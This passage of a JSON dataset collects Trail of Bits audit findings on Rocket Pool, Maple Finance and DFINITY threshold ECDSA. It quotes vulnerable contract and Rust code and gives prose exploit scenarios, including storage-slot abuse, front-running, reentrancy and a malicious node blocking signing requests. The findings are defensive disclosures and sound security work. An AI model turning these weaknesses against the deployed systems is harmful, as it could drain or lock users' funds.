operators funds. Recommendations Short term, remove all sstore operations from the RocketStorage contract. Use mappings, which are already used for strings and bytes, for all types. When using mappings, each value is stored in a slot that is computed from the hash of the mapping slot and the key, making it impossible for a user to write from one mapping into another unless that user nds a hash collision. Mappings will ensure proper separation of the protected storage areas. Strongly consider moving the protected storage areas and related operations into a separate immutable contract. This would make it much easier to check the access controls on the protected storage areas. Long term, avoid using assembly whenever possible. Ensure that assembly operations such as sstore do not enable the circumvention of access controls.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Current storage pattern fails to ensure type safety ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/RocketPool.pdf",
        "description": "As mentioned in TOB-ROCKET-001, the RocketStorage contract uses the eternal storage pattern. This pattern uses assembly to read and write to raw storage slots. Most of the systems data is stored in this manner, which is shown in gures 2.1 and 2.2. function setInt(bytes32 _key, int _value) onlyLatestRocketNetworkContract override external { assembly { sstore (_key, _value) } } Figure 2.1: RocketStorage.sol#L229-L233 function getUint(bytes32 _key) override external view returns (uint256 r) { assembly { r := sload (_key) } } Figure 2.2: RocketStorage.sol#L159-L163 If the same storage slot were used to write a value of type T and then to read a value of type U from the same slot, the value of U could be unexpected. Since storage is untyped, Soliditys type checker would be unable to catch this type mismatch, and the bug would go unnoticed. Exploit Scenario A codebase update causes one storage slot, S, to be used with two dierent data types. The compiler does not throw any errors, and the code is deployed. During transaction processing, an integer, -1, is written to S. Later, S is read and interpreted as an unsigned integer. Subsequent calculations use the maximum uint value, causing users to lose funds. Recommendations Short term, remove the assembly code and raw storage mapping from the codebase. Use a mapping for each type to ensure that each slot of the mapping stores values of the same type. Long term, avoid using assembly whenever possible. Use Solidity as a high-level language so that its built-in type checker will detect type errors.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Solidity compiler optimizations can be problematic ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/RocketPool.pdf",
        "description": "Rocket Pool has enabled optional compiler optimizations in Solidity. There have been several optimization bugs with security implications. Moreover, optimizations are actively being developed. Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. Therefore, it is unclear how well they are being tested and exercised. High-severity security issues due to optimization bugs have occurred in the past. A high-severity bug in the emscripten-generated solc-js compiler used by True and Remix persisted until late 2018. The x for this bug was not reported in the Solidity CHANGELOG. Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6. More recently, another bug due to the incorrect caching of keccak256 was reported. A compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe. It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations. Exploit Scenario A latent or future bug in Solidity compiler optimizationsor in the Emscripten transpilation to solc-jscauses a security vulnerability in the Rocket Pool contracts. Recommendations Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Upgradeable contracts can block minipool withdrawals ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/RocketPool.pdf",
        "description": "At the beginning of this audit, the Rocket Pool team mentioned an important invariant: if a node operator is allowed to withdraw funds from a minipool, the withdrawal should always succeed. This invariant is meant to assure node operators that they will be able to withdraw their funds even if the systems governance upgrades network contracts to malicious versions. To withdraw funds from a minipool, a node operator calls the close or refund function, depending on the state of the minipool. The close function calls rocketMinipoolManager.destroyMinipool. The rocketMinipoolManager contract can be upgraded by governance, which could replace it with a version in which destroyMinipool reverts. This would cause withdrawals to revert, breaking the guarantee mentioned above. The refund function does not call any network contracts. However, the refund function cannot be used to retrieve all of the funds that close can retrieve. Governance could also tamper with the withdrawal process by altering node operators withdrawal addresses. (See TOB-ROCKET-001 for more details.) Exploit Scenario Alice, a node operator, owns a dissolved minipool and decides to withdraw her funds. However, before Alice calls close() on her minipool to withdraw her funds, governance upgrades the RocketMinipoolManager contract to a version in which calls to destroyMinipool fail. As a result, the close() functions call to RocketMinipoolManager.destroyMinipool fails, and Alice is unable to withdraw her funds. Recommendations Short term, use Soliditys try catch statement to ensure that withdrawal functions that should always succeed are not aected by function failures in other network contracts. Additionally, ensure that no important data validation occurs in functions whose failures are ignored. Long term, carefully examine the process through which node operators execute withdrawals and ensure that their withdrawals cannot be blocked by other network contracts.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Lack of contract existence check on delegatecall will result in unexpected behavior ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/RocketPool.pdf",
        "description": "The RocketMinipool contract uses the delegatecall proxy pattern. If the implementation contract is incorrectly set or is self-destructed, the contract may not detect failed executions. The RocketMinipool contract implements a payable fallback function that is invoked when contract calls are executed. This function does not have a contract existence check: fallback(bytes calldata _input) external payable returns (bytes memory) { // If useLatestDelegate is set, use the latest delegate contract address delegateContract = useLatestDelegate ? getContractAddress(\"rocketMinipoolDelegate\") : rocketMinipoolDelegate; (bool success, bytes memory data) = delegateContract.delegatecall(_input); if (!success) { revert(getRevertMessage(data)); } return data; } Figure 5.1: RocketMinipool.sol#L102-L108 The constructor of the RocketMinipool contract also uses the delegatecall function without performing a contract existence check: constructor(RocketStorageInterface _rocketStorageAddress, address _nodeAddress, MinipoolDeposit _depositType) { [...] (bool success, bytes memory data) = getContractAddress(\"rocketMinipoolDelegate\").delegatecall(abi.encodeWithSignature('initialis e(address,uint8)', _nodeAddress, uint8(_depositType))); if (!success) { revert(getRevertMessage(data)); } } Figure 5.2: RocketMinipool.sol#L30-L43 A delegatecall to a destructed contract will return success as part of the EVM specication. The Solidity documentation includes the following warning: The low-level functions call, delegatecall and staticcall return true as their rst return value if the account called is non-existent, as part of the design of the EVM. Account existence must be checked prior to calling if needed. Figure 5.3: A snippet of the Solidity documentation detailing unexpected behavior related to delegatecall The contract will not throw an error if its implementation is incorrectly set or self-destructed. It will instead return success even though no code was executed. Exploit Scenario Eve upgrades the RocketMinipool contract to point to an incorrect new implementation. As a result, each delegatecall returns success without changing the state or executing code. Eve uses this failing to scam users. Recommendations Short term, implement a contract existence check before a delegatecall. Document the fact that suicide and selfdestruct can lead to unexpected behavior, and prevent future upgrades from introducing these functions. Long term, carefully review the Solidity documentation, especially the Warnings section, and the pitfalls of using the delegatecall proxy pattern. References  Contract Upgrade Anti-Patterns  Breaking Aave Upgradeability",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. tx.origin in RocketStorage authentication may be an attack vector ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/RocketPool.pdf",
        "description": "The RocketStorage contract contains all system storage values and the functions through which other contracts write to them. To prevent unauthorized calls, these functions are protected by the onlyLatestRocketNetworkContract modier. function setUint(bytes32 _key, uint _value) onlyLatestRocketNetworkContract override external { assembly { sstore (_key, _value) } } Figure 6.1: RocketStorage.sol#L205-209 The contract also contains a storageInit ag that is set to true when the system values have been initialized. function setDeployedStatus() external { // Only guardian can lock this down require(msg.sender == guardian, \"Is not guardian account\"); // Set it now storageInit = true; } Figure 6.2: RocketStorage.sol#L89-L94 The onlyLatestRocketNetworkContract modier has a switch and is disabled when the system is in the initialization phase. modifier onlyLatestRocketNetworkContract() { if (storageInit == true) { // Make sure the access is permitted to only contracts in our Dapp require(_getBool(keccak256(abi.encodePacked(\"contract.exists\", msg.sender))), \"Invalid or outdated network contract\"); } else { // Only Dapp and the guardian account are allowed access during initialisation. // tx.origin is only safe to use in this case for deployment since no external contracts are interacted with require(( tx.origin == guardian _getBool(keccak256(abi.encodePacked(\"contract.exists\", msg.sender))) || ), \"Invalid or outdated network contract attempting access during deployment\"); } _; } Figure 6.3: RocketStorage.sol#L36-L48 If the system is still in the initialization phase, any call that originates from the guardian account will be trusted. Exploit Scenario Eve creates a malicious airdrop contract, and Alice, the Rocket Pool systems guardian, calls it. The contract then calls RocketStorage and makes a critical storage update. After the updated value has been initialized, Alice sets storageInit to true, but the storage value set in the update persists, increasing the risk of a critical vulnerability. Recommendations Short term, clearly document the fact that during the initialization period, the guardian may not call any external contracts; nor may any system contract that the guardian calls make calls to untrusted parties. Long term, document all of the systems assumptions, both in the portions of code in which they are realized and in all places in which they aect stakeholders operations.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Duplicated storage-slot computation can silently introduce errors ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/RocketPool.pdf",
        "description": "Many parts of the Rocket Pool codebase that access its eternal storage compute storage locations inline, which means that these computations are duplicated throughout the codebase. Many string constants appear in the codebase several times; these include minipool.exists (shown in gure 7.1), which appears four times. Duplication of the same piece of information in many parts of a codebase increases the risk of inconsistencies. Furthermore, because the code lacks existence and type checks for these strings, inconsistencies introduced into a contract by developer error may not be detected unless the contract starts behaving in unexpected ways. setBool(keccak256(abi.encodePacked(\"minipool.exists\", contractAddress)), true); Figure 7.1: RocketMinipoolManager.sol#L216 Many storage-slot computations take parameters. However, there are no checks on the types or number of the parameters that they take, and incorrect parameter values will not be caught by the Solidity compiler. Exploit Scenario Bob, a developer, adds a functionality that sets the network.prices.submitted.node.key string constant. He ABI-encodes the node address, block, and RPL price arguments but forgets to ABI-encode the eective RPL stake amount. The code then sets an entirely new storage slot that is not read anywhere else. As a result, the write operation is a no-op with undened consequences. Recommendations Short term, extract the computation of storage slots into helper functions (like that shown in 7.2). This will ensure that each string constant exists only in a single place, removing the potential for inconsistencies. These functions can also check the types of the parameters used in storage-slot computations. function contractExistsSlot(address contract) external pure returns (bytes32) { return keccak256(abi.encodePacked(\"contract.exists\", contract); } // _getBool(keccak256(abi.encodePacked(\"contract.exists\", msg.sender)) _getBool(contractExistsSlot(msg.sender)) // setBool(keccak256(abi.encodePacked(\"contract.exists\", _contractAddress)), true) setBool(contractExistsSlot(_contractAddress), true) Figure 7.2: An example of a helper function Long term, replace the raw setters and getters in RocketBase (e.g., setAddress) with setters and getters for specic values (e.g., the setContractExists setter) and restrict RocketStorage access to these setters.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "8. Potential collisions between eternal storage and Solidity mapping storage slots ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/RocketPool.pdf",
        "description": "The Rocket Pool code uses eternal storage to store many named mappings. A named mapping is one that is identied by a string (such as minipool.exists) and maps a key (like contractAddress in gure 8.1) to a value. setBool(keccak256(abi.encodePacked(\"minipool.exists\", contractAddress)), true); Figure 8.1: RocketMinipoolManager.sol#L216 Given a mapping whose state variable appears at index N in the code, Solidity stores the value associated with key at a slot that is computed as follows: h = type(key) == string || type(key) == bytes ? keccak256 : left_pad_to_32_bytes slot = keccak256(abi.encodePacked(h(key), N)) Figure 8.2: Pseudocode of the Solidity computation of a mappings storage slot The rst item in a Rocket Pool mapping is the identier, which could enable an attacker to write values into a mapping that should be inaccessible to the attacker. We set the severity of this issue to informational because such an attack does not currently appear to be possible. Exploit Scenario Mapping A stores its state variable at slot n. Rocket Pool developers introduce new code, making it possible for an attacker to change the second argument to abi.encodePacked in the setBool setter (shown in gure 8.1). The attacker passes in a rst argument of 32 bytes and can then pass in n as the second argument and set an entry in Mapping A. Recommendations Short term, switch the order of arguments such that a mappings identier is the last argument and the key (or keys) is the rst (as in keccak256(key, unique_identifier_of_mapping)). Long term, carefully examine all raw storage operations and ensure that they cannot be used by attackers to access storage locations that should be inaccessible to them. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Attackers can prevent lenders from funding or renancing loans ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MapleFinance.pdf",
        "description": "For the MapleLoan contracts fundLoan method to fund a new loan, the balance of fundsAsset in the contract must be equal to the requested principal. // Amount funded and principal are as requested. amount_ = _principal = _principalRequested; // Cannot under/over fund loan, so that accounting works in context of PoolV1 require (_getUnaccountedAmount(_fundsAsset) == amount_, \"MLI:FL:WRONG_FUND_AMOUNT\" ); Figure 1.1: An excerpt of the fundLoan function ( contracts/MapleLoanInternals.sol#240244 ) An attacker could prevent a lender from funding a loan by making a small transfer of fundsAsset every time the lender tried to fund it (front-running the transaction). However, transaction fees would make the attack expensive. A similar issue exists in the Refinancer contract: If the terms of a loan were changed to increase the borrowed amount, an attacker could prevent a lender from accepting the new terms by making a small transfer of fundsAsset . The underlying call to increasePrincipal from within the acceptNewTerms function would then cause the transaction to revert. function increasePrincipal ( uint256 amount_ ) external override { require (_getUnaccountedAmount(_fundsAsset) == amount_, \"R:IP:WRONG_AMOUNT\" ); _principal += amount_; _principalRequested += amount_; _drawableFunds += amount_; emit PrincipalIncreased(amount_); 13 Maple Labs } Figure 1.2: The vulnerable method in the Refinancer contract ( contracts/Refinancer.sol#2330 ) Exploit Scenario A borrower tries to quickly increase the principal of a loan to take advantage of a short-term high-revenue opportunity. The borrower proposes new terms, and the lender tries to accept them. However, an attacker blocks the process and performs the protable operation himself. Recommendations Short term, allow the lender to withdraw funds in excess of the expected value (by calling getUnaccountedAmount(fundsAsset) ) before a loan is funded and between the proposal and acceptance of new terms. Alternatively, have fundLoan and increasePrincipal use greater-than-or-equal-to comparisons, rather than strict equality comparisons, to check whether enough tokens have been transferred to the contract; if there are excess tokens, use the same function to transfer them to the lender. Long term, avoid using exact comparisons for ether and token balances, as users can increase those balances by executing transfers, making the comparisons evaluate to false . 14 Maple Labs",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Reentrancies can lead to misordered events ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MapleFinance.pdf",
        "description": "Several functions in the codebase do not use the checks-eects-interactions pattern, lack reentrancy guards, or emit events after interactions. These functions interact with external and third-party contracts that can execute callbacks and call the functions again (reentering them). The event for a reentrant call will be emitted before the event for the rst call, meaning that o-chain event monitors will observe incorrectly ordered events. function liquidatePortion ( uint256 swapAmount_ , bytes calldata data_) external override { ERC20Helper.transfer(collateralAsset, msg.sender , swapAmount_); msg.sender .call(data_); uint256 returnAmount = getExpectedAmount(swapAmount_); require (ERC20Helper.transferFrom(fundsAsset, msg.sender , destination, returnAmount), \"LIQ:LP:TRANSFER_FROM\" ); emit PortionLiquidated(swapAmount_, returnAmount); } Figure 2.1: The liquidatePortion function ( contracts/Liquidator.sol#4151 ) We identied this issue in the following functions:  DebtLocker  setAuctioneer  _handleClaim  _handleClaimOfReposessed  acceptNewTerms  Liquidator  liquidatePortion  pullFunds  MapleLoan 15 Maple Labs  acceptNewTerms  closeLoan  fundLoan  makePayment  postCollateral  returnFunds  skim  upgrade Exploit Scenario Alice calls Liquidator.liquidatePortion (gure 2.1). Since fundsAsset is an ERC777 token (or another token that allows callbacks), a callback function that Alice has registered on ERC20Helper.transfer is called. Alice calls Liquidator.liquidatePortion again from within that callback function. The event for the second liquidation is emitted before the event for the rst liquidation. As a result, the events observed by o-chain event monitors are incorrectly ordered. Recommendations Short term, follow the checks-eects-interactions pattern and ensure that all functions emit events before interacting with other contracts that may allow reentrancies. Long term, integrate Slither into the CI pipeline. Slither can detect low-severity reentrancies like those mentioned in this nding as well as high-severity reentrancies. Use reentrancy guards on all functions that interact with other contracts. 16 Maple Labs",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "3. Lack of two-step process for critical operations ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MapleFinance.pdf",
        "description": "The MapleLoan contracts setBorrower and setLender functions transfer the privileged borrower and lender roles to new addresses. If, because of a bug or a mistake, one of those functions is called with an address inaccessible to the Maple Labs team, the transferred role will be permanently inaccessible. It may be possible to restore access to the lender role by upgrading the loan contract to a new implementation. However, only the borrower can upgrade a loan contract, so no such bailout option exists for a transfer of the borrower role to an inaccessible address. Using a two-step process for role transfers would prevent such issues. Exploit Scenario Alice, the borrower of a Maple loan, notices that her borrower address key might have been compromised. To be safe, she calls MapleLoan.setBorrower with a new address. Because of a bug in the script that she uses to set the new borrower, the new borrower is set to an address for which Alice does not have the private key. As a result, she is no longer able to access her loan contract. Recommendations Short term, perform role transfers through a two-step process in which the borrower or lender proposes a new address and the transfer is completed once the new address has executed a call to accept the role. Long term, investigate whether implementing additional two-step processes could prevent any other accidental lockouts. 17 Maple Labs",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "4. IERC20Like.decimals returns non-standard uint256 ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MapleFinance.pdf",
        "description": "IERC20Like.decimal s declares uint256 as its return type, whereas the ERC20 standard species that it must return a uint8 . As a result, functions that use the IERC20Like interface interpret the values returned by decimals as uint256 values; this can cause values greater than 255 to enter the protocol, which could lead to undened behavior. If the return type were uint8 , only the last byte of the return value would be used. Exploit Scenario A non-standard token with a decimals function that returns values greater than 255 is integrated into the protocol. The code is not prepared to handle decimals values greater than 255. As a result of the large value, the arithmetic becomes unstable, enabling an attacker to drain funds from the protocol. Recommendations Short term, change the return type of IERC20.decimals to uint8 . Long term, ensure that all interactions with ERC20 tokens follow the standard. 18 Maple Labs",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Transfers in Liquidator.liquidatePortion can fail silently ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MapleFinance.pdf",
        "description": "Calls to ERC20Helper.transfer in the codebase are wrapped in require statements, except for the rst such call in the liquidatePortion function of the Liquidator contract (gure 5.1). As such, a token transfer executed through this call can fail silently, meaning that liquidatePortion can take a user's funds without providing any collateral in return. This contravenes the expected behavior of the function and the behavior outlined in the docstring of ILiquidator.liquidatePortion (gure 5.2). function liquidatePortion ( uint256 swapAmount_ , bytes calldata data_) external override { ERC20Helper.transfer (collateralAsset, msg.sender , swapAmount_); msg.sender .call(data_); uint256 returnAmount = getExpectedAmount(swapAmount_); require (ERC20Helper.transferFrom(fundsAsset, msg.sender , destination, returnAmount), \"LIQ:LP:TRANSFER_FROM\" ); emit PortionLiquidated(swapAmount_, returnAmount); } Figure 5.1: The liquidatePortion function ( contracts/Liquidator.sol#4151 ) * @dev Flash loan function that : * @dev 1 . Transfers a specified amount of `collateralAsset` to ` msg.sender `. * @dev 2 . Performs an arbitrary call to ` msg.sender `, to trigger logic necessary to get `fundsAsset` (e.g., AMM swap). * @dev 3 . Perfroms a `transferFrom`, taking the corresponding amount of `fundsAsset` from the user. * @dev If the required amount of `fundsAsset` is not returned in step 3 , the entire transaction reverts. * @param swapAmount_ Amount of `collateralAsset` that is to be borrowed in the flashloan. * @param data_ 2 . ABI-encoded arguments to be used in the low-level call to perform step 19 Maple Labs */ Figure 5.2: Docstring of liquidatePortion ( contracts/interfaces/ILiquidator.sol#7683 ) Exploit Scenario A loan is liquidated, and its liquidator contract has a collateral balance of 300 ether. The current ether price is 4,200 USDC. Alice wants to prot o of the liquidation by taking out a ash loan of 300 ether. Having checked that the contract holds enough collateral to cover the transaction, she calls liquidatePortion(1260000, ) in the liquidator contract. At the same time, Bob decides to buy 10 ether from the liquidator contract. Bob calls Liquidator.liquidatePortion(42000) . Because his transaction is mined rst, the liquidator does not have enough collateral to complete the transfer of collateral to Alice. As a result, the liquidator receives a transfer of 1,260,000 USDC from Alice but does not provide any ether in return, leaving her with a $1,260,000 loss. Recommendations Short term, wrap ERC20Helper.transfer in a require statement to ensure that a failed transfer causes the entire transaction to revert. Long term, ensure that a failed transfer of tokens to or from a user always causes the entire transaction to revert. To do that, follow the recommendations outlined in TOB-MAPLE-006 and have the ERC20Helper.transfer and ERC20Helper.transferFrom functions revert on a failure. Ensure that all functions behave as expected , that their behavior remains predictable when transactions are reordered, and that the code does not contain any footguns or surprises. 20 Maple Labs",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "6. ERC20Helpers functions do not revert on a failure ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MapleFinance.pdf",
        "description": "The ERC20Helper contracts transfer , transferFrom , and approve functions do not revert on a failure. This makes it necessary for the developer to always check their return values. A failure to perform these checks can result in the introduction of high-severity bugs that can lead to a loss of funds. There are no uses of ERC20Helper.transfer for which not reverting on a failure is the best option. Making this standard behavior the default would make the code more robust and therefore more secure by default, as it would take less additional eort to make it secure. In the rare edge cases in which a transfer is allowed to fail or a failure status should be captured in a boolean, a try / catch statement can be used. Exploit Scenario Bob, a developer, writes a new function. He calls ERC20Helper.transfer but forgets to wrap the call in a require statement. As a result, token transfers can fail silently and lead to a loss of funds if that failure behavior is not accounted for. Recommendations Short term, have ERC20Helper.transfer , ERC20Helper.transferFrom , and ERC20Helper.approve revert on a failure. Long term, have all functions revert on a failure instead of returning false . Aim to make code secure by default so that less additional work will be required to make it secure. Additionally, whenever possible, avoid using optimizations that are detrimental to security. 21 Maple Labs",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "7. Lack of contract existence checks before low-level calls ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MapleFinance.pdf",
        "description": "The ERC20Helper contract lls a purpose similar to that of OpenZeppelin's SafeERC20 contract. However, while OpenZeppelin's SafeERC20 transfer and approve functions will revert when called on an address that is not a token contract address (i.e., one with zero-length bytecode), ERC20Helper s functions will appear to silently succeed without transferring or approving any tokens. If the address of an externally owned account (EOA) is used as a token address in the protocol, all transfers to it will appear to succeed without any tokens being transferred. This will result in undened behavior. Contract existence checks are usually performed via the EXTCODESIZE opcode. Since the EXTCODESIZE opcode would precede a CALL to a token address, adding EXTCODESIZE would make the CALL a warm access. As a result, adding the EXTCODESIZE check would increase the gas cost by only a little more than 100. Assuming a high gas price of 200 gwei and a current ether price of $4,200, that equates to an additional cost of 10 cents for each call to the functions of ERC20Helper , which is a low price to pay for increased security. The following functions lack contract existence checks:  ERC20Helper  call in _call  ProxyFactory  call in _initializeInstance  call in _upgradeInstance (line 66)  call in _upgradeInstance (line 72)  Proxied  delegatecall in _migrate  Proxy  delegatecall in _ fallback 22 Maple Labs  MapleLoanInternals  delegatecall in _acceptNewTerms Exploit Scenario A token contract is destroyed. However, since all transfers of the destroyed token will succeed, all Maple protocol users can transact as though they have an unlimited balance of that token. If contract existence checks were executed before those transfers, all transfers of the destroyed token would revert. Recommendations Short term, add a contract existence check before each of the low-level calls mentioned above. Long term, add contract existence checks before all low-level CALL s, DELEGATECALL s, and STATICCALL s. These checks are inexpensive and add an important layer of defense. 23 Maple Labs",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "8. Missing zero checks ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MapleFinance.pdf",
        "description": "A number of constructors and functions in the codebase do not revert if zero is passed in for a parameter that should not be set to zero. The following parameters are not checked for the zero value:  Liquidator contract  constructor()  owner_  collateralAsset_  fundsAsset_  auctioneer_  destination_  setAuctioneer()  auctioneer_  MapleLoan contract  setBorrower()  borrower_  setLender()  lender_  MapleProxyFactory contract  constructor()  mapleGlobals_ If zero is passed in for one of those parameters, it will render the contract unusable, leaving its funds locked (and therefore eectively lost) and necessitating an expensive redeployment. For example, if there were a bug in the front end, MapleLoan.setBorrower could be called with address(0) , rendering the contract unusable and locking its funds in it. 24 Maple Labs The gas cost of checking a parameter for the zero value is negligible. Since the parameter is usually already on the stack, a zero check consists of a DUP opcode (3 gas) and an ISZERO opcode (3 gas). Given a high gas price of 200 gwei and an ether price of $4,200, a zero check would cost half a cent. Exploit Scenario A new version of the front end is deployed. A borrower suspects that the address currently used for his or her loan might have been compromised. As a precautionary measure, the borrower decides to transfer ownership of the loan to a new address. However, the new version of the front end contains a bug: the value of an uninitialized variable is used to construct the transaction. As a result, the borrower loses access to the loan contract, and to the collateral, forever. If zero checks had been in place, the transaction would have reverted instead. Recommendations Short term, add zero checks for the parameters mentioned above and for all other parameters for which zero is not an acceptable value. Long term, comprehensively validate all parameters. Avoid relying solely on the validation performed by front-end code, scripts, or other contracts, as a bug in any of those components could prevent it from performing that validation. Additionally, integrate Slither into the CI pipeline to automatically detect functions that lack zero checks. 25 Maple Labs",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "9. Lack of user-controlled limits for input amount in Liquidator.liquidatePortion ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MapleFinance.pdf",
        "description": "The liquidatePortion function of the Liquidator contract computes the amount of funds that will be transferred from the caller to the liquidator contract. The computation uses an asset price retrieved from an oracle. There is no guarantee that the amount paid by the caller will correspond to the current market price, as a transaction that updates the price feed could be mined before the call to liquidatePortion in the liquidator contract. EOAs that call the function cannot predict the return value of the oracle. If the caller is a contract, though, it can check the return value, with some eort. Adding an upper limit to the amount paid by the caller would enable the caller to explicitly state his or her assumptions about the execution of the contract and to avoid paying too much. It would also provide additional protection against the misreporting of oracle prices. Since such a scenario is unlikely, we set the diculty level of this nding to high. Using caller-controlled limits for the amount of a transfer is a best practice commonly employed by large DeFi protocols such as Uniswap. Exploit Scenario Alice calls liquidatePortion in the liquidator contract. Due to an oracle malfunction, the amount of her transfer to the liquidator contract is much higher than the amount she would pay for the collateral on another market. Recommendations Short term, introduce a maxReturnAmount parameter and add a require statement require(returnAmount <= maxReturnAmount) to enforce that parameter. 26 Maple Labs Long term, always allow the caller to control the amount of a transfer. This is especially important for transfer amounts that depend on factors that can change between transactions. Enable the caller to add a lower limit for a transfer from a contract and an upper limit for a transfer of the callers funds to a contract. 27 Maple Labs A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Lack of validation of signed dealing against original dealing ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/DFINITYThresholdECDSAandBtcCanisters.pdf",
        "description": "The EcdsaPreSignerImpl::validate_dealing_support method does not check that the content of signed dealings matches the original dealings. A malicious receiver could exploit this lack of validation by changing the requested height (that is, the support.content.requested_height eld) or internal data (the support.content.idk_dealing.internal_dealing_raw eld) before signing the ECDSA dealing. The resulting signature would not be agged as invalid by the validate_dealing_support method but would result in an invalid aggregated signature. After all nodes sign a dealing, the EcdsaTranscriptBuilderImpl::build_transcript method checks the signed dealings content hashes before attempting to aggregate all the dealing support signatures to produce the nal aggregated signature. The method logs a warning when the hashes do not agree, but does not otherwise act on signed dealings with dierent content. let mut content_hash = BTreeSet::new(); for share in &support_shares { content_hash.insert(ic_crypto::crypto_hash(&share.content)); } if content_hash.len() > 1 { warn!( self.log, \"Unexpected multi share content: support_shares = {}, content_hash = {}\", support_shares.len(), content_hash.len() ); self.metrics.payload_errors_inc(\"invalid_content_hash\"); } if let Some(multi_sig) = self.crypto_aggregate_dealing_support( transcript_state.transcript_params, &support_shares, ) { } transcript_state.add_completed_dealing(signed_dealing.content, multi_sig); Figure 1.1: ic/rs/consensus/src/ecdsa/pre_signer.rs:1015-1034 The dealing content is added to the set of completed dealings along with the aggregated signature. When the node attempts to create a new transcript from the dealing, the aggregated signature is checked by IDkgProtocol::create_transcript. If a malicious receiver changes the content of a dealing before signing it, the resulting invalid aggregated signature would be rejected by this method. In such a case, the EcdsaTranscriptBuilderImpl methods build_transcript and get_completed_transcript would return None for the corresponding transcript ID. That is, neither the transcript nor the corresponding quadruple would be completed. Additionally, since signing requests are deterministically matched against quadruples, including quadruples that are not yet available, this issue could allow a single node to block the service of individual signing requests. pub(crate) fn get_signing_requests<'a>( ecdsa_payload: &ecdsa::EcdsaPayload, sign_with_ecdsa_contexts: &'a BTreeMap<CallbackId, SignWithEcdsaContext>, ) -> BTreeMap<ecdsa::RequestId, &'a SignWithEcdsaContext> { let known_random_ids: BTreeSet<[u8; 32]> = ecdsa_payload .iter_request_ids() .map(|id| id.pseudo_random_id) .collect::<BTreeSet<_>>(); let mut unassigned_quadruple_ids = ecdsa_payload.unassigned_quadruple_ids().collect::<Vec<_>>(); // sort in reverse order (bigger to smaller). unassigned_quadruple_ids.sort_by(|a, b| b.cmp(a)); let mut new_requests = BTreeMap::new(); // The following iteration goes through contexts in the order // of their keys, which is the callback_id. Therefore we are // traversing the requests in the order they were created. for context in sign_with_ecdsa_contexts.values() { if known_random_ids.contains(context.pseudo_random_id.as_slice()) { continue; }; if let Some(quadruple_id) = unassigned_quadruple_ids.pop() { let request_id = ecdsa::RequestId { quadruple_id, pseudo_random_id: context.pseudo_random_id, }; new_requests.insert(request_id, context); } else { break; } } new_requests } Figure 1.2: ic/rs/consensus/src/ecdsa/payload_builder.rs:752-782 Exploit Scenario A malicious node wants to prevent the signing request SRi from completing. Assume that the corresponding quadruple, Qi, is not yet available. The node waits until it receives a dealing corresponding to quadruple Qi. It generates a support message for the dealing, but before signing the dealing, the malicious node changes the dealing.idk_dealing.internal_dealing_raw eld. The signature is valid for the updated dealing but not for the original dealing. The malicious dealing support is gossiped to the other nodes in the network. Since the signature on the dealing support is correct, all nodes move the dealing support to the validated pool. However, when the dealing support signatures are aggregated by the other nodes, the aggregated signature is rejected as invalid, and no new transcript is created for the dealing. This means that the quadruple Qi never completes. Since the matching of signing requests to quadruples is deterministic, SRi is matched with Qi every time a new ECDSA payload is created. Thus, SRi is never serviced. Recommendations Short 